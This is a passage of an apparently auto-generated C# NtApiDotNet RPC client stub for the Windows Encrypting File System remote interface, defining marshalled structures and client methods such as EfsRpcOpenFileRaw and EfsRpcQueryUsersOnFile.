= Member0;\n        }\n    }\n    public struct Struct_4 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_20), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_20), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_4 CreateDefault()\n        {\n            return new Struct_4();\n        }\n        public Struct_4(int Member0, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_5 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_6[], long>(Member8, new System.Action<Struct_6[], long>(m.Write_21), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_6[]>(new System.Func<Struct_6[]>(u.Read_21), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_6[]> Member8;\n        public static Struct_5 CreateDefault()\n        {\n            return new Struct_5();\n        }\n        public Struct_5(int Member0, Struct_6[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_6 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_2>(Member8, new System.Action<Struct_2>(m.Write_2));\n            m.WriteEmbeddedPointer<Struct_7>(Member10, new System.Action<Struct_7>(m.Write_7));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_2>(new System.Func<Struct_2>(u.Read_2), false);\n            Member10 = u.ReadEmbeddedPointer<Struct_7>(new System.Func<Struct_7>(u.Read_7), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_2> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_7> Member10;\n        public static Struct_6 CreateDefault()\n        {\n            return new Struct_6();\n        }\n        public Struct_6(int Member0, System.Nullable<Struct_2> Member8, System.Nullable<Struct_7> Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_7 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_22), Member4);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_22), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_7 CreateDefault()\n        {\n            return new Struct_7();\n        }\n        public Struct_7(int Member0, int Member4, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_8 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_23), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_23), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_8 CreateDefault()\n        {\n            return new Struct_8();\n        }\n        public Struct_8(int Member0, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_9 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_24), NtApiDotNet.Win32.Rpc.RpcUtils.OpPlus(Member4, Member0));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_24), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_9 CreateDefault()\n        {\n            return new Struct_9();\n        }\n        public Struct_9(int Member0, int Member4, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_10 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_0>(Member8, new System.Action<Struct_0>(m.Write_0));\n            m.WriteEmbeddedPointer<Struct_6>(Member10, new System.Action<Struct_6>(m.Write_6));\n            m.WriteEmbeddedPointer<Struct_8>(Member18, new System.Action<Struct_8>(m.Write_8));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_0>(new System.Func<Struct_0>(u.Read_0), false);\n            Member10 = u.ReadEmbeddedPointer<Struct_6>(new System.Func<Struct_6>(u.Read_6), false);\n            Member18 = u.ReadEmbeddedPointer<Struct_8>(new System.Func<Struct_8>(u.Read_8), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_0> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_6> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_8> Member18;\n        public static Struct_10 CreateDefault()\n        {\n            return new Struct_10();\n        }\n        public Struct_10(int Member0, System.Nullable<Struct_0> Member8, System.Nullable<Struct_6> Member10, System.Nullable<Struct_8> Member18)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n        }\n    }\n    public struct Struct_11 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_12[], long>(Member8, new System.Action<Struct_12[], long>(m.Write_25), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_12[]>(new System.Func<Struct_12[]>(u.Read_25), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_12[]> Member8;\n        public static Struct_11 CreateDefault()\n        {\n            return new Struct_11();\n        }\n        public Struct_11(int Member0, Struct_12[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_12 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_2>(Member8, new System.Action<Struct_2>(m.Write_2));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_2>(new System.Func<Struct_2>(u.Read_2), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_2> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public static Struct_12 CreateDefault()\n        {\n            return new Struct_12();\n        }\n        public Struct_12(int Member0, System.Nullable<Struct_2> Member8, string Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_13 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.Write_26(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member0, \"Member0\"));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.Read_26();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 1;\n        }\n        public sbyte[] Member0;\n        public static Struct_13 CreateDefault()\n        {\n            Struct_13 ret = new Struct_13();\n            ret.Member0 = new sbyte[16];\n            return ret;\n        }\n        public Struct_13(sbyte[] Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    public struct Struct_14 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_15[], long>(Member8, new System.Action<Struct_15[], long>(m.Write_27), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_15[]>(new System.Func<Struct_15[]>(u.Read_27), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_15[]> Member8;\n        public static Struct_14 CreateDefault()\n        {\n            return new Struct_14();\n        }\n        public Struct_14(int Member0, Struct_15[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_15 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<System.Guid[], long>(Member8, new System.Action<System.Guid[], long>(m.Write_28), Member0);\n            m.WriteInt32(Member10);\n            m.WriteEmbeddedPointer<long[], long>(Member18, new System.Action<long[], long>(m.Write_29), Member10);\n            m.WriteEmbeddedPointer<string>(Member20, new System.Action<string>(m.WriteTerminatedString));\n            m.Write_16(Member28);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<System.Guid[]>(new System.Func<System.Guid[]>(u.Read_28), false);\n            Member10 = u.ReadInt32();\n            Member18 = u.ReadEmbeddedPointer<long[]>(new System.Func<long[]>(u.Read_29), false);\n            Member20 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member28 = u.Read_16();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<System.Guid[]> Member8;\n        public int Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<long[]> Member18;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member20;\n        public Struct_16 Member28;\n        public static Struct_15 CreateDefault()\n        {\n            return new Struct_15();\n        }\n        public Struct_15(int Member0, System.Guid[] Member8, int Member10, long[] Member18, string Member20, Struct_16 Member28)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member20 = Member20;\n            this.Member28 = Member28;\n        }\n    }\n    public struct Struct_16 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public static Struct_16 CreateDefault()\n        {\n            return new Struct_16();\n        }\n        public Struct_16(int Member0, int Member4)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n        }\n    }\n    #endregion\n    #region Client Implementation\n    public sealed class Client : NtApiDotNet.Win32.Rpc.RpcClientBase\n    {\n        public Client() : \n                base(\"df1941c5-fe89-4e79-bf10-463657acf44d\", 1, 0)\n        {\n        }\n        private _Unmarshal_Helper SendReceive(int p, _Marshal_Helper m)\n        {\n            return new _Unmarshal_Helper(SendReceive(p, m.DataRepresentation, m.ToArray(), m.Handles));\n        }\n        public int EfsRpcOpenFileRaw(out NtApiDotNet.Ndr.Marshal.NdrContextHandle p0, string p1, int p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            m.WriteInt32(p2);\n            _Unmarshal_Helper u = SendReceive(0, m);\n            p0 = u.ReadContextHandle();\n            return u.ReadInt32();\n        }\n        public int EfsRpcReadFileRaw(NtApiDotNet.Ndr.Marshal.NdrContextHandle p0, out NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteContextHandle(p0);\n            _Unmarshal_Helper u = SendReceive(1, m);\n            p1 = u.Read_30();\n            return u.ReadInt32();\n        }\n        public int EfsRpcWriteFileRaw(NtApiDotNet.Ndr.Marshal.NdrContextHandle p0, NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteContextHandle(p0);\n            m.Write_31(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            _Unmarshal_Helper u = SendReceive(2, m);\n            return u.ReadInt32();\n        }\n        public void EfsRpcCloseRaw(ref NtApiDotNet.Ndr.Marshal.NdrContextHandle p0)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteContextHandle(p0);\n            _Unmarshal_Helper u = SendReceive(3, m);\n            p0 = u.ReadContextHandle();\n        }\n        public int EfsRpcEncryptFileSrv(string p0)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            _Unmarshal_Helper u = SendReceive(4, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcDecryptFileSrv(string p0, int p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteInt32(p1);\n            _Unmarshal_Helper u = SendReceive(5, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcQueryUsersOnFile(string p0, out System.Nullable<Struct_0> p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            _Unmarshal_Helper u = SendReceive(6, m);\n            p1 = u.ReadReferentValue<Struct_0>(new System.Func<Struct_0>(u.Read_0), false);\n            return u.ReadInt32();\n        }\n        public int EfsRpcQueryRecoveryAgents(string p0, out System.Nullable<Struct_0> p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            _Unmarshal_Helper u = SendReceive(7, m);\n            p1 = u.ReadReferentValue<Struct_0>(new System.Func<Struct_0>(u.Read_0), false);\n            return u.ReadInt32();\n        }\n        public int EfsRpcRemoveUsersFromFile(string p0, Struct_0 p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.Write_0(p1);\n            _Unmarshal_Helper u = SendReceive(8, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcAddUsersToFile(string p0, Struct_5 p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.Write_5(p1);\n            _Unmarshal_Helper u = SendReceive(9, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcSetFileEncryptionKey(System.Nullable<Struct_6> p0, int p1, int p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteReferent(p0, new System.Action<Struct_6>(m.Write_6));\n            m.WriteInt32(p1);\n            m.WriteInt32(p2);\n            _Unmarshal_Helper u = SendReceive(10, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcFileKeyInfoEx(string p0, string p1, int p2, int p3, System.Nullable<Struct_8> p4, int p5)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            m.WriteInt32(p2);\n            m.WriteInt32(p3);\n            m.WriteReferent(p4, new System.Action<Struct_8>(m.Write_8));\n            m.WriteInt32(p5);\n            _Unmarshal_Helper u = SendReceive(11, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcFileKeyInfo(string p0, int p1, out System.Nullable<Struct_8> p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteInt32(p1);\n            _Unmarshal_Helper u = SendReceive(12, m);\n            p2 = u.ReadReferentValue<Struct_8>(new System.Func<Struct_8>(u.Read_8), false);\n            return u.ReadInt32();\n        }\n        public int EfsRpcDuplicateEncryptionInfoFile(string p0, string p1, int p2, int p3, System.Nullable<Struct_8> p4, int p5)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            m.WriteInt32(p2);\n            m.WriteInt32(p3);\n            m.WriteReferent(p4, new System.Action<Struct_8>(m.Write_8));\n            m.WriteInt32(p5);\n            _Unmarshal_Helper u = SendReceive(13, m);\n            return u.ReadInt32();\n        }\n        public int EfsUsePinForEncryptedFiles(Struct_4 p0, Struct_9 p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.Write_4(p0);\n            m.Write_9(p1);\n            _Unmarshal_Helper u = SendReceive(14, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcAddUsersToFileEx(int p0, System.Nullable<Struct_8> p1, string p2, Struct_5 p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteInt32(p0);\n            m.WriteReferent(p1, new System.Action<Struct_8>(m.Write_8));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p2, \"p2\"));\n            m.Write_5(p3);\n            _Unmarshal_Helper u = SendReceive(15, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcFileKeyInfoEx_16(int p0, System.Nullable<Struct_8> p1, string p2, int p3, out System.Nullable<Struct_8> p4)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteInt32(p0);\n            m.WriteReferent(p1, new System.Action<Struct_8>(m.Write_8));\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p2, \"p2\"));\n            m.WriteInt32(p3);\n            _Unmarshal_Helper u = SendReceive(16, m);\n            p4 = u.ReadReferentValue<Struct_8>(new System.Func<Struct_8>(u.Read_8), false);\n            return u.ReadInt32();\n        }\n        public int EfsRpcFileKeyInfoEx_17(out System.Nullable<Struct_8> p0)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            _Unmarshal_Helper u = SendReceive(17, m);\n            p0 = u.ReadReferentValue<Struct_8>(new System.Func<Struct_8>(u.Read_8), false);\n            return u.ReadInt32();\n        }\n        public int EfsRpcFileKeyInfoEx_18(string p0, out System.Nullable<Struct_8> p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            _Unmarshal_Helper u = SendReceive(18, m);\n            p1 = u.ReadReferentValue<Struct_8>(new System.Func<Struct_8>(u.Read_8), false);\n            return u.ReadInt32();\n        }\n        public int EfsRpcFileKeyInfoEx_19(string p0, System.Nullable<Struct_8> p1, Struct_8 p2, System.Nullable<Struct_10> p3)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteReferent(p1, new System.Action<Struct_8>(m.Write_8));\n            m.Write_8(p2);\n            m.WriteReferent(p3, new System.Action<Struct_10>(m.Write_10));\n            _Unmarshal_Helper u = SendReceive(19, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcFlushEfsCache()\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            _Unmarshal_Helper u = SendReceive(20, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcEncryptFileExSrv(string p0, string p1, int p2)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            m.WriteReferent(p1, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(p2);\n            _Unmarshal_Helper u = SendReceive(21, m);\n            return u.ReadInt32();\n        }\n        public int EfsRpcQueryProtectors(string p0, out System.Nullable<Struct_11> p1)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteTerminatedString(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p0, \"p0\"));\n            _Unmarshal_Helper u = SendReceive(22, m);\n            p1 = u.ReadReferentValue<Struct_11>(new System.Func<Struct_11>(u.Read_11), false);\n            return u.ReadInt32();\n        }\n        public int EfsRpcWriteFileWithHeaderRaw(NtApiDotNet.Ndr.Marshal.NdrContextHandle p0, NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> p1, Struct_8 p2, long p3, int p4)\n        {\n            _Marshal_Helper m = new _Marshal_Helper();\n            m.WriteContextHandle(p0);\n            m.Write_32(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(p1, \"p1\"));\n            m.Write_8(p2);\n            m.WriteInt64(p3);\n            m.WriteInt32(p4);\n            